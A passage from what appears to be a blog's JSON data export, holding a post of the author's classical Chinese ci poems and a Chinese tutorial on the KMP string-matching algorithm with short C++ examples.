天落青灯<br>\n天落青灯，昨岁似曾，爆竹隔空，唯见飞星。<br>\n天落青灯，铜锣隐停，烟花落零，月笼彩凝。<br>\n天落青灯，花市昼仍，烛心曳风，何去何从？<br>\n天落青灯，夙愿已明，莫问坠影，尘飞烟红。<br>\n(春哥对我\"天落青灯\"四字,居然被我找到了/2014/2)\n\n\n\n","source":"_posts/2016-10-03-poem.markdown","raw":"---\nlayout:     post\ntitle:      \"Don't know how to name a title\"\ntags:\n    - Life\n---\n\n> “故事与事故. ”\n\n\n## 前言\n\n数量不多，质量也不好，选了几篇，留个纪念。\n\n\n\n---\n\n## 正文\n\n- #### 临江仙<br>\n十年心事十年忧，一枕凉簟清秋。梧桐听雨独倚楼，心海微澜，水浅不胜舟。<br>\n梦里曾记少年游，笑语盈盈谁羞。雨掸秋叶落肩头，欲言还休，只是去年愁。<br> \n(给XingWuXuanJi)\n\n\n---\n\n- #### 长相思<br>\n夜朦胧，鸟朦胧，长街柳岸雾华浓，无歌且听风。<br>\n山匆匆，水匆匆，心事只饮醉颜红，灯花已结空。\n\n\n---\n- #### 采桑子<br>\n虚竹一叶临窗扫，风也悄悄，人也悄悄，叶上寒露湿红梢。<br>\n却道何事伤心早，醒也烦恼，梦也烦恼，月下江村更寂寥。\n\n\n---\n- #### 柳梢青<br>\n一夜成霜，新花吹落，雨催寒食。浮生几何，光阴虚掷，不知何世。<br>\n飞鸿踏雪无字。觉几度，才下泪迟。沉思前事，去年此时，好景如斯。\n\n\n---\n- #### 青衫湿<br>\n青云沉笔雨淋铃，风吹花糁径。旧时书展，鸳鸯小字，湿遍青衫。<br>\n寻常往事，落樱犹滞，总负深情。欲结绸缪，料应未有，芷约兰期。<br>\n(读旧时书信)\n\n\n---\n- #### 踏莎行<br>\n归期未定，遣人闻惊。等闲谈笑声犹凝。常叹此生醉复醒，美景良辰把酒听。<br>\n新来多病，有泪如倾。朱颜暗换堪临镜。旧事如烟休重省，灯昏风定人初静。<br>\n(一面而别)\n\n\n---\n- #### 于中好•中秋<br>\n冷雨微收晓寒轻，红叶间漏过中庭。少年解舟对谁醒，梦里寒花落河星。<br>\n新明月，旧心情，斜阳清秋与云平。不负如来不负卿，也无风雨也无晴。<br>\n(10/04/2017)\n\n\n---\n\n\n## Addition\n\n- #### 天落青灯<br>\n天落青灯，昨岁似曾，爆竹隔空，唯见飞星。<br>\n天落青灯，铜锣隐停，烟花落零，月笼彩凝。<br>\n天落青灯，花市昼仍，烛心曳风，何去何从？<br>\n天落青灯，夙愿已明，莫问坠影，尘飞烟红。<br>\n(春哥对我\"天落青灯\"四字,居然被我找到了/2014/2)\n\n\n\n","slug":"poem","published":1,"date":"2016-10-02T16:00:00.000Z","updated":"2018-04-23T11:18:08.000Z","comments":1,"photos":[],"link":"","_id":"cji4qizao0002rikexxzdtsl0","content":"<blockquote>\n<p>“故事与事故. ”</p>\n</blockquote>\n<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>数量不多，质量也不好，选了几篇，留个纪念。</p>\n<hr>\n<h2 id=\"正文\"><a href=\"#正文\" class=\"headerlink\" title=\"正文\"></a>正文</h2><ul>\n<li><h4 id=\"临江仙\"><a href=\"#临江仙\" class=\"headerlink\" title=\"临江仙\"></a>临江仙<br></h4>十年心事十年忧，一枕凉簟清秋。梧桐听雨独倚楼，心海微澜，水浅不胜舟。<br><br>梦里曾记少年游，笑语盈盈谁羞。雨掸秋叶落肩头，欲言还休，只是去年愁。<br><br>(给XingWuXuanJi)</li>\n</ul>\n<hr>\n<ul>\n<li><h4 id=\"长相思\"><a href=\"#长相思\" class=\"headerlink\" title=\"长相思\"></a>长相思<br></h4>夜朦胧，鸟朦胧，长街柳岸雾华浓，无歌且听风。<br><br>山匆匆，水匆匆，心事只饮醉颜红，灯花已结空。</li>\n</ul>\n<hr>\n<ul>\n<li><h4 id=\"采桑子\"><a href=\"#采桑子\" class=\"headerlink\" title=\"采桑子\"></a>采桑子<br></h4>虚竹一叶临窗扫，风也悄悄，人也悄悄，叶上寒露湿红梢。<br><br>却道何事伤心早，醒也烦恼，梦也烦恼，月下江村更寂寥。</li>\n</ul>\n<hr>\n<ul>\n<li><h4 id=\"柳梢青\"><a href=\"#柳梢青\" class=\"headerlink\" title=\"柳梢青\"></a>柳梢青<br></h4>一夜成霜，新花吹落，雨催寒食。浮生几何，光阴虚掷，不知何世。<br><br>飞鸿踏雪无字。觉几度，才下泪迟。沉思前事，去年此时，好景如斯。</li>\n</ul>\n<hr>\n<ul>\n<li><h4 id=\"青衫湿\"><a href=\"#青衫湿\" class=\"headerlink\" title=\"青衫湿\"></a>青衫湿<br></h4>青云沉笔雨淋铃，风吹花糁径。旧时书展，鸳鸯小字，湿遍青衫。<br><br>寻常往事，落樱犹滞，总负深情。欲结绸缪，料应未有，芷约兰期。<br><br>(读旧时书信)</li>\n</ul>\n<hr>\n<ul>\n<li><h4 id=\"踏莎行\"><a href=\"#踏莎行\" class=\"headerlink\" title=\"踏莎行\"></a>踏莎行<br></h4>归期未定，遣人闻惊。等闲谈笑声犹凝。常叹此生醉复醒，美景良辰把酒听。<br><br>新来多病，有泪如倾。朱颜暗换堪临镜。旧事如烟休重省，灯昏风定人初静。<br><br>(一面而别)</li>\n</ul>\n<hr>\n<ul>\n<li><h4 id=\"于中好•中秋\"><a href=\"#于中好•中秋\" class=\"headerlink\" title=\"于中好•中秋\"></a>于中好•中秋<br></h4>冷雨微收晓寒轻，红叶间漏过中庭。少年解舟对谁醒，梦里寒花落河星。<br><br>新明月，旧心情，斜阳清秋与云平。不负如来不负卿，也无风雨也无晴。<br><br>(10/04/2017)</li>\n</ul>\n<hr>\n<h2 id=\"Addition\"><a href=\"#Addition\" class=\"headerlink\" title=\"Addition\"></a>Addition</h2><ul>\n<li><h4 id=\"天落青灯\"><a href=\"#天落青灯\" class=\"headerlink\" title=\"天落青灯\"></a>天落青灯<br></h4>天落青灯，昨岁似曾，爆竹隔空，唯见飞星。<br><br>天落青灯，铜锣隐停，烟花落零，月笼彩凝。<br><br>天落青灯，花市昼仍，烛心曳风，何去何从？<br><br>天落青灯，夙愿已明，莫问坠影，尘飞烟红。<br><br>(春哥对我”天落青灯”四字,居然被我找到了/2014/2)</li>\n</ul>\n","site":{"data":{"projects":[{"name":"Sjtueat","url":"http://sjtueat.miyunluo.com","desc":"Help you to decide what to eat today"},{"name":"Easy Flash Tool","url":"https://github.com/miyunluo/CortexM4-flashtool","desc":"A easy python flash tool for TI TM4C1294"}]}},"excerpt":"","more":"<blockquote>\n<p>“故事与事故. ”</p>\n</blockquote>\n<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>数量不多，质量也不好，选了几篇，留个纪念。</p>\n<hr>\n<h2 id=\"正文\"><a href=\"#正文\" class=\"headerlink\" title=\"正文\"></a>正文</h2><ul>\n<li><h4 id=\"临江仙\"><a href=\"#临江仙\" class=\"headerlink\" title=\"临江仙\"></a>临江仙<br></h4>十年心事十年忧，一枕凉簟清秋。梧桐听雨独倚楼，心海微澜，水浅不胜舟。<br><br>梦里曾记少年游，笑语盈盈谁羞。雨掸秋叶落肩头，欲言还休，只是去年愁。<br><br>(给XingWuXuanJi)</li>\n</ul>\n<hr>\n<ul>\n<li><h4 id=\"长相思\"><a href=\"#长相思\" class=\"headerlink\" title=\"长相思\"></a>长相思<br></h4>夜朦胧，鸟朦胧，长街柳岸雾华浓，无歌且听风。<br><br>山匆匆，水匆匆，心事只饮醉颜红，灯花已结空。</li>\n</ul>\n<hr>\n<ul>\n<li><h4 id=\"采桑子\"><a href=\"#采桑子\" class=\"headerlink\" title=\"采桑子\"></a>采桑子<br></h4>虚竹一叶临窗扫，风也悄悄，人也悄悄，叶上寒露湿红梢。<br><br>却道何事伤心早，醒也烦恼，梦也烦恼，月下江村更寂寥。</li>\n</ul>\n<hr>\n<ul>\n<li><h4 id=\"柳梢青\"><a href=\"#柳梢青\" class=\"headerlink\" title=\"柳梢青\"></a>柳梢青<br></h4>一夜成霜，新花吹落，雨催寒食。浮生几何，光阴虚掷，不知何世。<br><br>飞鸿踏雪无字。觉几度，才下泪迟。沉思前事，去年此时，好景如斯。</li>\n</ul>\n<hr>\n<ul>\n<li><h4 id=\"青衫湿\"><a href=\"#青衫湿\" class=\"headerlink\" title=\"青衫湿\"></a>青衫湿<br></h4>青云沉笔雨淋铃，风吹花糁径。旧时书展，鸳鸯小字，湿遍青衫。<br><br>寻常往事，落樱犹滞，总负深情。欲结绸缪，料应未有，芷约兰期。<br><br>(读旧时书信)</li>\n</ul>\n<hr>\n<ul>\n<li><h4 id=\"踏莎行\"><a href=\"#踏莎行\" class=\"headerlink\" title=\"踏莎行\"></a>踏莎行<br></h4>归期未定，遣人闻惊。等闲谈笑声犹凝。常叹此生醉复醒，美景良辰把酒听。<br><br>新来多病，有泪如倾。朱颜暗换堪临镜。旧事如烟休重省，灯昏风定人初静。<br><br>(一面而别)</li>\n</ul>\n<hr>\n<ul>\n<li><h4 id=\"于中好•中秋\"><a href=\"#于中好•中秋\" class=\"headerlink\" title=\"于中好•中秋\"></a>于中好•中秋<br></h4>冷雨微收晓寒轻，红叶间漏过中庭。少年解舟对谁醒，梦里寒花落河星。<br><br>新明月，旧心情，斜阳清秋与云平。不负如来不负卿，也无风雨也无晴。<br><br>(10/04/2017)</li>\n</ul>\n<hr>\n<h2 id=\"Addition\"><a href=\"#Addition\" class=\"headerlink\" title=\"Addition\"></a>Addition</h2><ul>\n<li><h4 id=\"天落青灯\"><a href=\"#天落青灯\" class=\"headerlink\" title=\"天落青灯\"></a>天落青灯<br></h4>天落青灯，昨岁似曾，爆竹隔空，唯见飞星。<br><br>天落青灯，铜锣隐停，烟花落零，月笼彩凝。<br><br>天落青灯，花市昼仍，烛心曳风，何去何从？<br><br>天落青灯，夙愿已明，莫问坠影，尘飞烟红。<br><br>(春哥对我”天落青灯”四字,居然被我找到了/2014/2)</li>\n</ul>\n"},{"layout":"post","title":"KMP算法之鄙见","_content":"\n> “想起了那晚站在代码巅峰的ZK大神. ”\n\n\n## 前言\n\n前一阵子看**《编译原理 第二版》**，在**\"3.4.5 &ensp; 3.4节的练习\"**(P86)中看到了这么一道题（*练习3.4.2*），大意是要在一个字符串中识别一个子字符串，于是它定义了一个叫“失效函数”的东西，题目第二段还提到个算法是由 Knuth, Morris, Pratt 这三个人提出的。看着这三个人的名字觉得有些眼熟，首字母拼起来不就是 KMP 么。\n\n其实这就是 **KMP** 算法，解决在字符串中找子字符串的问题。在这里给没听过子字符串概念的同学解释一下子字符串，子字符串就是删除某前缀和某后缀后得到的字符串。比如，String A = miyunluo，String B = yun，那么 B 就是 A 的子串。\n\n讲道理KMP算法的讲解，网上能搜出来一卡车，套路都差不多，基本上都涉及到什么 **移动** 再加 **Next[]** 数组，不管你怎么看，反正我在差不多一年前看这些东西是没看懂（还是在ZK大神讲解的情况下...）。于是借着这道题，再加上又看了一些博客，我也来写一写KMP，尽量写的清楚，希望大家可以看懂。\n\n---\n\n## 正文\n\n对于题目中的失效函数，放在后面来说，我们先来看看KMP算法的过程。\n\n借用 **练习3.3.7** 中的例子，为了使得过程可以尽量长一些，对题目(1)的串做一些修改。设String A = **abababaababac**, String B = **ababac**，下面运行KMP算法。\n\n用指针 i, j 表示 A，B 当前匹配的位置，即就是A[i-j+1 ... i] 与 B[1 ... j]完全相等。对于整个过程而言，i 是不断增加的，j 做相应的调整，当 j 等于B的长度时，就结束了，匹配成功。也就是说，我们顺序遍历A串，某一时刻已经满足A[i-j+1 ... i] == B[1 ... j]，但是下一位B[j+1] != A[i+1]，这时就要调整 j 的值（当然减小 j），设减小后是 j' ，使得B[1 ... j']依然可以与A[i-j'+1 ... i]匹配（注意这里A的起始匹配地址已经变成了i-j'+1），当然这里的 j' 越大越好。接下来看过程。\n\ni&ensp;=&ensp;1&ensp;2&ensp;3&ensp;4&ensp;**5**&ensp;6&ensp;7&ensp;8&ensp;9<br>\nA =&ensp;a&ensp;b&ensp;a&ensp;b&ensp;**a**&ensp;b&ensp;a&ensp;a&ensp;b&ensp;a&ensp;b&ensp;a&ensp;c<br>\nB =&ensp;a&ensp;b&ensp;a&ensp;b&ensp;**a**&ensp;c<br>\nj&ensp;=&ensp;1&ensp;2&ensp;3&ensp;4&ensp;**5**&ensp;6\n\n现在 A 和 B 匹配到了 i = 5, j = 5 的地方，但是二者的下一位 A[i+1] 与 B[j+1] 并不相等，说明这时继续向后匹配失败，需要减小 j 的值，使得 j' 可以在 i = 5 的地方继续匹配，现在 A[1 ... 5] = ababa，我们发现 j' = 3 时 B[1 ... 3] = aba 可以与 A[5-3+1 ... 5] 即 A[3 ... 5]匹配，于是新的 j = 3.\n\ni&ensp;=&ensp;1&ensp;2&ensp;3&ensp;4&ensp;**5**&ensp;6&ensp;7&ensp;8&ensp;9<br>\nA =&ensp;a&ensp;b&ensp;a&ensp;b&ensp;**a**&ensp;b&ensp;a&ensp;a&ensp;b&ensp;a&ensp;b&ensp;a&ensp;c<br>\nB =&ensp;&ensp;&ensp;&ensp;&ensp;a&ensp;b&ensp;**a**&ensp;b&ensp;a&ensp;c<br>\nj&ensp;=&ensp;&ensp;&ensp;&ensp;&ensp;1&ensp;2&ensp;**3**&ensp;4&ensp;5&ensp;6\n\n继续增加 i ，同时向后匹配 j ，当匹配到 i = 7, j = 5 时，又出现下一位不相等的情况\n\ni&ensp;=&ensp;1&ensp;2&ensp;3&ensp;4&ensp;5&ensp;6&ensp;**7**&ensp;8&ensp;9<br>\nA =&ensp;a&ensp;b&ensp;a&ensp;b&ensp;a&ensp;b&ensp;**a**&ensp;a&ensp;b&ensp;a&ensp;b&ensp;a&ensp;c<br>\nB =&ensp;&ensp;&ensp;&ensp;&ensp;a&ensp;b&ensp;a&ensp;b&ensp;**a**&ensp;c<br>\nj&ensp;=&ensp;&ensp;&ensp;&ensp;&ensp;1&ensp;2&ensp;3&ensp;4&ensp;**5**&ensp;6\n\n由上一步知道，此时又应该将 j 减小为 j ＝ 3。这样可以使得 A[5 ... 7] == B[1 ... 3].\n\ni&ensp;=&ensp;1&ensp;2&ensp;3&ensp;4&ensp;5&ensp;6&ensp;**7**&ensp;8&ensp;9<br>\nA =&ensp;a&ensp;b&ensp;a&ensp;b&ensp;a&ensp;b&ensp;**a**&ensp;a&ensp;b&ensp;a&ensp;b&ensp;a&ensp;c<br>\nB =&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;a&ensp;b&ensp;**a**&ensp;b&ensp;a&ensp;c<br>\nj&ensp;=&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;1&ensp;2&ensp;**3**&ensp;4&ensp;5&ensp;6\n\n继续向后匹配，又出现了 A[i+1] != B[j+1] 的情况看。这时需要减小 j ，使得 B[1 ... j]仍然可以在 i = 7 处匹配，于是只能将 j 减小为1.\n\ni&ensp;=&ensp;1&ensp;2&ensp;3&ensp;4&ensp;5&ensp;6&ensp;**7**&ensp;8&ensp;9<br>\nA =&ensp;a&ensp;b&ensp;a&ensp;b&ensp;a&ensp;b&ensp;**a**&ensp;a&ensp;b&ensp;a&ensp;b&ensp;a&ensp;c<br>\nB =&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;**a**&ensp;b&ensp;a&ensp;b&ensp;a&ensp;c<br>\nj&ensp;=&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;**1**&ensp;2&ensp;3&ensp;4&ensp;5&ensp;6\n\n此时B紧接着第二位就不匹配了，j 已经减小到了最小值1，说明j已经无法调整了，那我们只好放弃 i = 7,从下一个与B[1]相等的地方开始。在目前的情况下，很碰巧，下一个A[i] == B[1] 的地方就是 i ＝ 8，于是我们从 i = 8 的地方重新开始。\n\ni&ensp;=&ensp;1&ensp;2&ensp;3&ensp;4&ensp;5&ensp;6&ensp;7&ensp;**8**&ensp;9<br>\nA =&ensp;a&ensp;b&ensp;a&ensp;b&ensp;a&ensp;b&ensp;a&ensp;**a**&ensp;b&ensp;a&ensp;b&ensp;a&ensp;c<br>\nB =&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;**a**&ensp;b&ensp;a&ensp;b&ensp;a&ensp;c<br>\nj&ensp;=&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;**1**&ensp;2&ensp;3&ensp;4&ensp;5&ensp;6\n\n继续向后，匹配完成。\n\nKMP的过程便是如此，但是我们每次要怎么减小 j 到适当的值似乎还没有解决。这就是课本上提到的失效函数，用它来解决当我们某一步匹配失效的时候，调整 j 的问题。假设我们用这个失效函数预先处理一下 B 字符串，得到了一个数组，叫它 Pre 数组好了（*先不用管它是如何实现的*），保存的值是，当某一个 j 失效时，应该调整为的 j' 值，借用上面的例子，第一次失效时，j = 5，应该调整为 j' = 3，那么 Pre[5]的值就是 3，第二次失效时 j = 3，应该调整为 j' = 1，那么 Pre[3] 的值就是 1。因此，当某一个 j 失效时，我们只要查一下 Pre[] 数组，就可以知道我们要减小到的 j' 值，即 j' = Pre[j]。\n\n有了 Pre[] 数组，我们就可以写出 KMP 算法的代码了，设 A 串长为 n，B 串长为 m。\n\n``` c++\nint i, j = 0;\nfor(i = 1;i<=n;++i)\n{\n\twhile(j>0 && B[j+1] != A[i]) j = Pre[j];\n\tif(B[j+1] == A[i]) j = j+1;\n\tif(j == m)\n\t{\n\t\tcout << \"匹配开始于: \"<< i-m << endl;\n\t\tj = Pre[j];\n\t}\n}\n```\n现在考虑 Pre[] 这个数组的意义与这个数组如何得到。还是用上面的例子。\n\ni&ensp;=&ensp;1&ensp;2&ensp;3&ensp;4&ensp;**5**&ensp;6&ensp;7&ensp;8&ensp;9<br>\nA =&ensp;a&ensp;b&ensp;a&ensp;b&ensp;**a**&ensp;b&ensp;a&ensp;a&ensp;b&ensp;a&ensp;b&ensp;a&ensp;c<br>\nB =&ensp;a&ensp;b&ensp;a&ensp;b&ensp;**a**&ensp;c<br>\nj&ensp;=&ensp;1&ensp;2&ensp;3&ensp;4&ensp;**5**&ensp;6\n\n现在相当于 A B 两个字符串都是从头开始比较的，但是在 i = 5, j = 5 时发现无法再向后匹配了，比较直观的做法是，放弃这次比较，从 i = 2 的地方开始与 B 字符串重新比较，这样的时间复杂度显然是 O(mn) 的，因为我们没有考虑 B 字符串本身的一些特性。对于 j ＝ 5，对应的B的前缀为ababa，我们发现 B[1 ... 3] == B[3 ... 5] == aba，正是基于此，我们可以减小 j到3，（相当于后移B）使得此时在 i = 5, j = 3 处又可以继续向后进行。\n\n从上面的解释中，我们可以看出求 Pre[] 数组，就相当于对于 B 的每一个前缀 B' ，求 B’ 的**最长相同前缀与后缀**。代码如下\n\n``` c++\nint i, j =0;\nPre[1] = 0;\nfor(i = 2;i<=m;++i)\n{\n\twhile(j>0 && B[j+1] != B[i]) j = Pre[j];\n\tif(B[j+1] == B[i]) j = j+1;\n\tPre[i] = j;\n}\n```\n为什么这个代码与 KMP 的代码如此相似，没错，你可以这么想，现在要求 B 的**所有前缀** 的 **最长相同前缀与后缀**（有点绕），那么就相当于是 B 的自匹配嘛。指针 i 所指的位置，就是 B'结束的位置，即 B' = B[1 ... i]（B'现在是B的一个前缀）, j 指针的位置就是 B' 的一个前缀，这不就是 B' 的前缀与 B' 的后缀匹配了嘛。\n\n以上就是传说中的 KMP 算法。<br>\n写的好累＝。＝\n","source":"_posts/2016-10-07-KMP.markdown","raw":"---\nlayout:     post\ntitle:      \"KMP算法之鄙见\"\ntags:\n    - Algorithm\n---\n\n> “想起了那晚站在代码巅峰的ZK大神. ”\n\n\n## 前言\n\n前一阵子看**《编译原理 第二版》**，在**\"3.4.5 &ensp; 3.4节的练习\"**(P86)中看到了这么一道题（*练习3.4.2*），大意是要在一个字符串中识别一个子字符串，于是它定义了一个叫“失效函数”的东西，题目第二段还提到个算法是由 Knuth, Morris, Pratt 这三个人提出的。看着这三个人的名字觉得有些眼熟，首字母拼起来不就是 KMP 么。\n\n其实这就是 **KMP** 算法，解决在字符串中找子字符串的问题。在这里给没听过子字符串概念的同学解释一下子字符串，子字符串就是删除某前缀和某后缀后得到的字符串。比如，String A = miyunluo，String B = yun，那么 B 就是 A 的子串。\n\n讲道理KMP算法的讲解，网上能搜出来一卡车，套路都差不多，基本上都涉及到什么 **移动** 再加 **Next[]** 数组，不管你怎么看，反正我在差不多一年前看这些东西是没看懂（还是在ZK大神讲解的情况下...）。于是借着这道题，再加上又看了一些博客，我也来写一写KMP，尽量写的清楚，希望大家可以看懂。\n\n---\n\n## 正文\n\n对于题目中的失效函数，放在后面来说，我们先来看看KMP算法的过程。\n\n借用 **练习3.3.7** 中的例子，为了使得过程可以尽量长一些，对题目(1)的串做一些修改。设String A = **abababaababac**, String B = **ababac**，下面运行KMP算法。\n\n用指针 i, j 表示 A，B 当前匹配的位置，即就是A[i-j+1 ... i] 与 B[1 ... j]完全相等。对于整个过程而言，i 是不断增加的，j 做相应的调整，当 j 等于B的长度时，就结束了，匹配成功。也就是说，我们顺序遍历A串，某一时刻已经满足A[i-j+1 ... i] == B[1 ... j]，但是下一位B[j+1] != A[i+1]，这时就要调整 j 的值（当然减小 j），设减小后是 j' ，使得B[1 ... j']依然可以与A[i-j'+1 ... i]匹配（注意这里A的起始匹配地址已经变成了i-j'+1），当然这里的 j' 越大越好。接下来看过程。\n\ni&ensp;=&ensp;1&ensp;2&ensp;3&ensp;4&ensp;**5**&ensp;6&ensp;7&ensp;8&ensp;9<br>\nA =&ensp;a&ensp;b&ensp;a&ensp;b&ensp;**a**&ensp;b&ensp;a&ensp;a&ensp;b&ensp;a&ensp;b&ensp;a&ensp;c<br>\nB =&ensp;a&ensp;b&ensp;a&ensp;b&ensp;**a**&ensp;c<br>\nj&ensp;=&ensp;1&ensp;2&ensp;3&ensp;4&ensp;**5**&ensp;6\n\n现在 A 和 B 匹配到了 i = 5, j = 5 的地方，但是二者的下一位 A[i+1] 与 B[j+1] 并不相等，说明这时继续向后匹配失败，需要减小 j 的值，使得 j' 可以在 i = 5 的地方继续匹配，现在 A[1 ... 5] = ababa，我们发现 j' = 3 时 B[1 ... 3] = aba 可以与 A[5-3+1 ... 5] 即 A[3 ... 5]匹配，于是新的 j = 3.\n\ni&ensp;=&ensp;1&ensp;2&ensp;3&ensp;4&ensp;**5**&ensp;6&ensp;7&ensp;8&ensp;9<br>\nA =&ensp;a&ensp;b&ensp;a&ensp;b&ensp;**a**&ensp;b&ensp;a&ensp;a&ensp;b&ensp;a&ensp;b&ensp;a&ensp;c<br>\nB =&ensp;&ensp;&ensp;&ensp;&ensp;a&ensp;b&ensp;**a**&ensp;b&ensp;a&ensp;c<br>\nj&ensp;=&ensp;&ensp;&ensp;&ensp;&ensp;1&ensp;2&ensp;**3**&ensp;4&ensp;5&ensp;6\n\n继续增加 i ，同时向后匹配 j ，当匹配到 i = 7, j = 5 时，又出现下一位不相等的情况\n\ni&ensp;=&ensp;1&ensp;2&ensp;3&ensp;4&ensp;5&ensp;6&ensp;**7**&ensp;8&ensp;9<br>\nA =&ensp;a&ensp;b&ensp;a&ensp;b&ensp;a&ensp;b&ensp;**a**&ensp;a&ensp;b&ensp;a&ensp;b&ensp;a&ensp;c<br>\nB =&ensp;&ensp;&ensp;&ensp;&ensp;a&ensp;b&ensp;a&ensp;b&ensp;**a**&ensp;c<br>\nj&ensp;=&ensp;&ensp;&ensp;&ensp;&ensp;1&ensp;2&ensp;3&ensp;4&ensp;**5**&ensp;6\n\n由上一步知道，此时又应该将 j 减小为 j ＝ 3。这样可以使得 A[5 ... 7] == B[1 ... 3].\n\ni&ensp;=&ensp;1&ensp;2&ensp;3&ensp;4&ensp;5&ensp;6&ensp;**7**&ensp;8&ensp;9<br>\nA =&ensp;a&ensp;b&ensp;a&ensp;b&ensp;a&ensp;b&ensp;**a**&ensp;a&ensp;b&ensp;a&ensp;b&ensp;a&ensp;c<br>\nB =&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;a&ensp;b&ensp;**a**&ensp;b&ensp;a&ensp;c<br>\nj&ensp;=&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;1&ensp;2&ensp;**3**&ensp;4&ensp;5&ensp;6\n\n继续向后匹配，又出现了 A[i+1] != B[j+1] 的情况看。这时需要减小 j ，使得 B[1 ... j]仍然可以在 i = 7 处匹配，于是只能将 j 减小为1.\n\ni&ensp;=&ensp;1&ensp;2&ensp;3&ensp;4&ensp;5&ensp;6&ensp;**7**&ensp;8&ensp;9<br>\nA =&ensp;a&ensp;b&ensp;a&ensp;b&ensp;a&ensp;b&ensp;**a**&ensp;a&ensp;b&ensp;a&ensp;b&ensp;a&ensp;c<br>\nB =&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;**a**&ensp;b&ensp;a&ensp;b&ensp;a&ensp;c<br>\nj&ensp;=&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;**1**&ensp;2&ensp;3&ensp;4&ensp;5&ensp;6\n\n此时B紧接着第二位就不匹配了，j 已经减小到了最小值1，说明j已经无法调整了，那我们只好放弃 i = 7,从下一个与B[1]相等的地方开始。在目前的情况下，很碰巧，下一个A[i] == B[1] 的地方就是 i ＝ 8，于是我们从 i = 8 的地方重新开始。\n\ni&ensp;=&ensp;1&ensp;2&ensp;3&ensp;4&ensp;5&ensp;6&ensp;7&ensp;**8**&ensp;9<br>\nA =&ensp;a&ensp;b&ensp;a&ensp;b&ensp;a&ensp;b&ensp;a&ensp;**a**&ensp;b&ensp;a&ensp;b&ensp;a&ensp;c<br>\nB =&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;**a**&ensp;b&ensp;a&ensp;b&ensp;a&ensp;c<br>\nj&ensp;=&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;**1**&ensp;2&ensp;3&ensp;4&ensp;5&ensp;6\n\n继续向后，匹配完成。\n\nKMP的过程便是如此，但是我们每次要怎么减小 j 到适当的值似乎还没有解决。这就是课本上提到的失效函数，用它来解决当我们某一步匹配失效的时候，调整 j 的问题。假设我们用这个失效函数预先处理一下 B 字符串，得到了一个数组，叫它 Pre 数组好了（*先不用管它是如何实现的*），保存的值是，当某一个 j 失效时，应该调整为的 j' 值，借用上面的例子，第一次失效时，j = 5，应该调整为 j' = 3，那么 Pre[5]的值就是 3，第二次失效时 j = 3，应该调整为 j' = 1，那么 Pre[3] 的值就是 1。因此，当某一个 j 失效时，我们只要查一下 Pre[] 数组，就可以知道我们要减小到的 j' 值，即 j' = Pre[j]。\n\n有了 Pre[] 数组，我们就可以写出 KMP 算法的代码了，设 A 串长为 n，B 串长为 m。\n\n``` c++\nint i, j = 0;\nfor(i = 1;i<=n;++i)\n{\n\twhile(j>0 && B[j+1] != A[i]) j = Pre[j];\n\tif(B[j+1] == A[i]) j = j+1;\n\tif(j == m)\n\t{\n\t\tcout << \"匹配开始于: \"<< i-m << endl;\n\t\tj = Pre[j];\n\t}\n}\n```\n现在考虑 Pre[] 这个数组的意义与这个数组如何得到。还是用上面的例子。\n\ni&ensp;=&ensp;1&ensp;2&ensp;3&ensp;4&ensp;**5**&ensp;6&ensp;7&ensp;8&ensp;9<br>\nA =&ensp;a&ensp;b&ensp;a&ensp;b&ensp;**a**&ensp;b&ensp;a&ensp;a&ensp;b&ensp;a&ensp;b&ensp;a&ensp;c<br>\nB =&ensp;a&ensp;b&ensp;a&ensp;b&ensp;**a**&ensp;c<br>\nj&ensp;=&ensp;1&ensp;2&ensp;3&ensp;4&ensp;**5**&ensp;6\n\n现在相当于 A B 两个字符串都是从头开始比较的，但是在 i = 5, j = 5 时发现无法再向后匹配了，比较直观的做法是，放弃这次比较，从 i = 2 的地方开始与 B 字符串重新比较，这样的时间复杂度显然是 O(mn) 的，因为我们没有考虑 B 字符串本身的一些特性。对于 j ＝ 5，对应的B的前缀为ababa，我们发现 B[1 ... 3] == B[3 ... 5] == aba，正是基于此，我们可以减小 j到3，（相当于后移B）使得此时在 i = 5, j = 3 处又可以继续向后进行。\n\n从上面的解释中，我们可以看出求 Pre[] 数组，就相当于对于 B 的每一个前缀 B' ，求 B’ 的**最长相同前缀与后缀**。代码如下\n\n``` c++\nint i, j =0;\nPre[1] = 0;\nfor(i = 2;i<=m;++i)\n{\n\twhile(j>0 && B[j+1] != B[i]) j = Pre[j];\n\tif(B[j+1] == B[i]) j = j+1;\n\tPre[i] = j;\n}\n```\n为什么这个代码与 KMP 的代码如此相似，没错，你可以这么想，现在要求 B 的**所有前缀** 的 **最长相同前缀与后缀**（有点绕），那么就相当于是 B 的自匹配嘛。指针 i 所指的位置，就是 B'结束的位置，即 B' = B[1 ... i]（B'现在是B的一个前缀）, j 指针的位置就是 B' 的一个前缀，这不就是 B' 的前缀与 B' 的后缀匹配了嘛。\n\n以上就是传说中的 KMP 